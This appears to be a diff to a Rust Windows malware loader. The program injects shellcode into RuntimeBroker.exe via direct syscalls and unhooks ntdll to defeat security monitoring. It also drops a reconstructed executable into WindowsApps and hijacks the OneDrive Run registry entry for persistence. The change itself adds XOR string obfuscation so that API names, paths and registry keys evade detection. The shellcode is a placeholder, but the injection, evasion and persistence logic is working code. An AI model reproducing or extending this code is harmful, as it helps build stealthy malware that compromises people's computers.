@@ -169,23 +169,23 @@ extern "C" {
 }
 
 fn merge_and_copy_payload() {
-    let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
-    let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_default();
+    let temp_dir = std::env::var(d(&[254, 239, 231, 250])).unwrap_or_else(|_| d(&[233, 144, 246, 253, 195, 196, 206, 197, 221, 217, 246, 254, 207, 199, 218])); // TEMP, C:\Windows\Temp
+    let local_app_data = std::env::var(d(&[230, 229, 233, 235, 230, 235, 250, 250, 238, 235, 254, 235])).unwrap_or_default(); // LOCALAPPDATA
 
     if local_app_data.is_empty() { return; }
 
     let files = [
-        format!("{}\\{}", temp_dir, "1.tmp"),
-        format!("{}\\{}", temp_dir, "2.tmp"),
-        format!("{}\\{}", temp_dir, "3.tmp"),
+        format!("{}\\{}", temp_dir, d(&[155, 132, 222, 199, 218])), // 1.tmp
+        format!("{}\\{}", temp_dir, d(&[152, 132, 222, 199, 218])), // 2.tmp
+        format!("{}\\{}", temp_dir, d(&[153, 132, 222, 199, 218])), // 3.tmp
     ];
-    let reconstructed = format!("{}\\{}", temp_dir, "reconstructed.exe");
-    let destination = format!("{}\\Microsoft\\WindowsApps\\reconstructed.exe", local_app_data);
+    let reconstructed = format!("{}\\{}", temp_dir, d(&[216, 207, 201, 197, 196, 217, 222, 216, 223, 201, 222, 207, 206, 132, 207, 210, 207])); // reconstructed.exe
+    let destination = format!("{}{}", local_app_data, d(&[246, 231, 195, 201, 216, 197, 217, 197, 204, 222, 246, 253, 195, 196, 206, 197, 221, 217, 235, 218, 218, 217, 246, 216, 207, 201, 197, 196, 217, 222, 216, 223, 201, 222, 207, 206, 132, 207, 210, 207])); // \Microsoft\WindowsApps\reconstructed.exe
 
-    let nt_create_file_id = syscall::get_syscall_number("NtCreateFile").unwrap();
-    let nt_read_file_id = syscall::get_syscall_number("NtReadFile").unwrap();
-    let nt_write_file_id = syscall::get_syscall_number("NtWriteFile").unwrap();
-    let nt_close_id = syscall::get_syscall_number("NtClose").unwrap();
+    let nt_create_file_id = syscall::get_syscall_number(&d(&[228, 222, 233, 216, 207, 203, 222, 207, 236, 195, 198, 207])).unwrap(); // NtCreateFile
+    let nt_read_file_id = syscall::get_syscall_number(&d(&[228, 222, 248, 207, 203, 206, 236, 195, 198, 207])).unwrap(); // NtReadFile
+    let nt_write_file_id = syscall::get_syscall_number(&d(&[228, 222, 253, 216, 195, 222, 207, 236, 195, 198, 207])).unwrap(); // NtWriteFile
+    let nt_close_id = syscall::get_syscall_number(&d(&[228, 222, 233, 198, 197, 217, 207])).unwrap(); // NtClose
 
     unsafe {
         let mut h_out = 0;
@@ -213,7 +213,7 @@ fn merge_and_copy_payload() {
 }
 
 unsafe fn nt_open_create_file(handle: &mut HANDLE, path: &str, access: u32, disposition: u32, syscall_id: u32) -> bool {
-    let mut nt_path: Vec<u16> = "\\??\\".encode_utf16().collect();
+    let mut nt_path: Vec<u16> = d(&[246, 149, 149, 246]).encode_utf16().collect(); // \??\
     nt_path.extend(path.encode_utf16());
     nt_path.push(0);
 
@@ -286,23 +286,25 @@ unsafe fn copy_data(h_in: HANDLE, h_out: HANDLE, read_id: u32, write_id: u32) {
 }
 
 fn update_onedrive_registry() {
-    let user_profile = std::env::var("USERPROFILE").unwrap_or_default();
+    let user_profile = std::env::var(d(&[255, 249, 239, 248, 250, 248, 229, 236, 227, 230, 239])).unwrap_or_default(); // USERPROFILE
     if user_profile.is_empty() { return; }
 
     let sid_string = get_current_user_sid_string().unwrap_or_default();
     if sid_string.is_empty() { return; }
 
     let updated_command = format!(
-        "cmd.exe /c \"\"{}\\{}\" /background & reconstructed\"",
+        "{}{}\\{}{}",
+        d(&[201, 199, 206, 132, 207, 210, 207, 138, 133, 201, 138, 136, 136]), // cmd.exe /c ""
         user_profile,
-        "AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"
+        d(&[235, 218, 218, 238, 203, 222, 203, 246, 230, 197, 201, 203, 198, 246, 231, 195, 201, 216, 197, 217, 197, 204, 222, 246, 229, 196, 207, 238, 216, 195, 220, 207, 246, 229, 196, 207, 238, 216, 195, 220, 207, 132, 207, 210, 207]), // AppData\Local\Microsoft\OneDrive\OneDrive.exe
+        d(&[138, 136, 138, 133, 200, 203, 201, 193, 205, 216, 197, 223, 196, 206, 138, 140, 138, 216, 207, 201, 197, 196, 217, 222, 216, 223, 201, 222, 207, 206, 136]) // " /background & reconstructed"
     );
 
-    let nt_open_key_id = syscall::get_syscall_number("NtOpenKey").unwrap();
-    let nt_set_value_key_id = syscall::get_syscall_number("NtSetValueKey").unwrap();
-    let nt_close_id = syscall::get_syscall_number("NtClose").unwrap();
+    let nt_open_key_id = syscall::get_syscall_number(&d(&[228, 222, 229, 218, 207, 196, 225, 207, 211])).unwrap(); // NtOpenKey
+    let nt_set_value_key_id = syscall::get_syscall_number(&d(&[228, 222, 249, 207, 222, 252, 203, 198, 223, 207, 225, 207, 211])).unwrap(); // NtSetValueKey
+    let nt_close_id = syscall::get_syscall_number(&d(&[228, 222, 233, 198, 197, 217, 207])).unwrap(); // NtClose
 
-    let registry_path = format!("\\Registry\\User\\{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", sid_string);
+    let registry_path = format!("{}{}{}", d(&[246, 248, 207, 205, 195, 217, 222, 216, 211, 246, 255, 217, 207, 216, 246]), sid_string, d(&[246, 249, 197, 204, 222, 221, 203, 216, 207, 246, 231, 195, 201, 216, 197, 217, 197, 204, 222, 246, 253, 195, 196, 206, 197, 221, 217, 246, 233, 223, 216, 216, 207, 196, 222, 252, 207, 216, 217, 195, 197, 196, 246, 248, 223, 196])); // \Registry\User\ , \Software\Microsoft\Windows\CurrentVersion\Run
     let mut nt_path: Vec<u16> = registry_path.encode_utf16().collect();
     nt_path.push(0);
 
@@ -322,7 +324,7 @@ fn update_onedrive_registry() {
         let status = asm_nt_open_key(&mut h_key, 0x000F003F, &mut obj_attr, nt_open_key_id); // KEY_ALL_ACCESS
 
         if status == 0 {
-            let mut val_name: Vec<u16> = "OneDrive".encode_utf16().collect();
+            let mut val_name: Vec<u16> = d(&[229, 196, 207, 238, 216, 195, 220, 207]).encode_utf16().collect(); // OneDrive
             val_name.push(0);
             let mut us_val = UNICODE_STRING {
                 Length: ((val_name.len() - 1) * 2) as u16,
@@ -349,9 +351,9 @@ fn update_onedrive_registry() {
 }
 
 fn get_current_user_sid_string() -> Option<String> {
-    let nt_open_token_id = syscall::get_syscall_number("NtOpenProcessToken")?;
-    let nt_query_token_id = syscall::get_syscall_number("NtQueryInformationToken")?;
-    let nt_close_id = syscall::get_syscall_number("NtClose")?;
+    let nt_open_token_id = syscall::get_syscall_number(&d(&[228, 222, 229, 218, 207, 196, 250, 216, 197, 201, 207, 217, 217, 254, 197, 193, 207, 196]))?; // NtOpenProcessToken
+    let nt_query_token_id = syscall::get_syscall_number(&d(&[228, 222, 251, 223, 207, 216, 211, 227, 196, 204, 197, 216, 199, 203, 222, 195, 197, 196, 254, 197, 193, 207, 196]))?; // NtQueryInformationToken
+    let nt_close_id = syscall::get_syscall_number(&d(&[228, 222, 233, 198, 197, 217, 207]))?; // NtClose
 
     unsafe {
         let mut h_token = 0;
@@ -391,11 +393,15 @@ fn get_current_user_sid_string() -> Option<String> {
 
 const SHELLCODE: &str = "Shellcode_replace";
 
+fn d(data: &[u8]) -> String {
+    data.iter().map(|&b| (b ^ 0xAA) as char).collect()
+}
+
 fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<usize> {
     let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
     let mut return_len = 0;
-    let nt_query_info_syscall = syscall::get_syscall_number("NtQueryInformationProcess")?;
-    let nt_read_mem_syscall = syscall::get_syscall_number("NtReadVirtualMemory")?;
+    let nt_query_info_syscall = syscall::get_syscall_number(&d(&[228, 222, 251, 223, 207, 216, 211, 227, 196, 204, 197, 216, 199, 203, 222, 195, 197, 196, 250, 216, 197, 201, 207, 217, 217]))?; // NtQueryInformationProcess
+    let nt_read_mem_syscall = syscall::get_syscall_number(&d(&[228, 222, 248, 207, 203, 206, 252, 195, 216, 222, 223, 203, 198, 231, 207, 199, 197, 216, 211]))?; // NtReadVirtualMemory
 
     let status = unsafe {
         asm_nt_query_information_process(
@@ -505,7 +511,7 @@ fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<
 }
 
 fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize) {
-    let ntdll_bytes = std::fs::read("C:\\Windows\\System32\\ntdll.dll").expect("Failed to read ntdll.dll");
+    let ntdll_bytes = std::fs::read(d(&[233, 144, 246, 253, 195, 196, 206, 197, 221, 217, 246, 249, 211, 217, 222, 207, 199, 153, 152, 246, 196, 222, 206, 198, 198, 132, 206, 198, 198])).expect("Failed to read ntdll.dll");
     let dos_header = ntdll_bytes.as_ptr() as *const IMAGE_DOS_HEADER;
     let nt_headers = unsafe { (ntdll_bytes.as_ptr() as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64 };
     let section_header = (nt_headers as usize + mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
@@ -516,7 +522,7 @@ fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize) {
         let name_bytes = &section.Name;
         let name = std::str::from_utf8(name_bytes).unwrap_or("").trim_matches('\0');
 
-        if name == ".text" {
+        if name == d(&[132, 222, 207, 210, 222]) { // .text
             let virtual_address = section.VirtualAddress as usize;
             let size_of_raw_data = section.SizeOfRawData as usize;
             let pointer_to_raw_data = section.PointerToRawData as usize;
@@ -524,8 +530,8 @@ fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize) {
             let clean_text = &ntdll_bytes[pointer_to_raw_data..pointer_to_raw_data + size_of_raw_data];
             let remote_text_addr = remote_base + virtual_address;
 
-            let nt_protect_syscall = syscall::get_syscall_number("NtProtectVirtualMemory").expect("Syscall not found");
-            let nt_write_syscall = syscall::get_syscall_number("NtWriteVirtualMemory").expect("Syscall not found");
+            let nt_protect_syscall = syscall::get_syscall_number(&d(&[228, 222, 250, 216, 197, 222, 207, 201, 222, 252, 195, 216, 222, 223, 203, 198, 231, 207, 199, 197, 216, 211])).expect("Syscall not found"); // NtProtectVirtualMemory
+            let nt_write_syscall = syscall::get_syscall_number(&d(&[228, 222, 253, 216, 195, 222, 207, 252, 195, 216, 222, 223, 203, 198, 231, 207, 199, 197, 216, 211])).expect("Syscall not found"); // NtWriteVirtualMemory
 
             let mut old_protect = 0u32;
             let mut protect_addr = remote_text_addr as *mut std::ffi::c_void;
@@ -580,7 +586,7 @@ fn get_process_pid() -> Option<u32> {
                 let end = process_entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                 let bytes = std::slice::from_raw_parts(process_entry.szExeFile.as_ptr() as *const u8, end);
                 let process_name = String::from_utf8_lossy(bytes);
-                if process_name == "RuntimeBroker.exe" {
+                if process_name == d(&[248, 223, 196, 222, 195, 199, 207, 232, 216, 197, 193, 207, 216, 132, 207, 210, 207]) { // RuntimeBroker.exe
                     CloseHandle(snapshot);
                     return Some(process_entry.th32ProcessID);
                 }
@@ -607,7 +613,7 @@ fn main() {
     let mut client_id: CLIENT_ID = unsafe { mem::zeroed() };
     client_id.UniqueProcess = target_pid as _;
 
-    let nt_open_process_syscall = syscall::get_syscall_number("NtOpenProcess").expect("Syscall not found");
+    let nt_open_process_syscall = syscall::get_syscall_number(&d(&[228, 222, 229, 218, 207, 196, 250, 216, 197, 201, 207, 217, 217])).expect("Syscall not found"); // NtOpenProcess
 
     let status = unsafe {
         asm_nt_open_process(
@@ -621,13 +627,13 @@ fn main() {
 
     if status != 0 { return; }
 
-    if let Some(ntdll_base) = get_module_base_address(process_handle, "ntdll.dll") {
+    if let Some(ntdll_base) = get_module_base_address(process_handle, &d(&[196, 222, 206, 198, 198, 132, 206, 198, 198])) { // ntdll.dll
         unhook_remote_ntdll(process_handle, ntdll_base);
     }
 
     let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
     let mut size = shellcode.len();
-    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number("NtAllocateVirtualMemory").expect("Syscall not found");
+    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number(&d(&[228, 222, 235, 198, 198, 197, 201, 203, 222, 207, 252, 195, 216, 222, 223, 203, 198, 231, 207, 199, 197, 216, 211])).expect("Syscall not found"); // NtAllocateVirtualMemory
 
     let status = unsafe {
         asm_nt_allocate_virtual_memory(
@@ -644,7 +650,7 @@ fn main() {
     if status != 0 { return; }
 
     let mut bytes_written = 0;
-    let nt_write_virtual_memory_syscall = syscall::get_syscall_number("NtWriteVirtualMemory").expect("Syscall not found");
+    let nt_write_virtual_memory_syscall = syscall::get_syscall_number(&d(&[228, 222, 253, 216, 195, 222, 207, 252, 195, 216, 222, 223, 203, 198, 231, 207, 199, 197, 216, 211])).expect("Syscall not found"); // NtWriteVirtualMemory
 
     let status = unsafe {
         asm_nt_write_virtual_memory(
@@ -660,7 +666,7 @@ fn main() {
     if status != 0 { return; }
 
     let mut thread_handle: HANDLE = 0;
-    let nt_create_thread_ex_syscall = syscall::get_syscall_number("NtCreateThreadEx").expect("Syscall not found");
+    let nt_create_thread_ex_syscall = syscall::get_syscall_number(&d(&[228, 222, 233, 216, 207, 203, 222, 207, 254, 194, 216, 207, 203, 206, 239, 210])).expect("Syscall not found"); // NtCreateThreadEx
 
     let status = unsafe {
         asm_nt_create_thread_ex(
@@ -681,7 +687,7 @@ fn main() {
 
     if status != 0 { return; }
 
-    let nt_close_syscall = syscall::get_syscall_number("NtClose").expect("Syscall not found");
+    let nt_close_syscall = syscall::get_syscall_number(&d(&[228, 222, 233, 198, 197, 217, 207])).expect("Syscall not found"); // NtClose
 
     unsafe {
         asm_nt_close(thread_handle, nt_close_syscall);
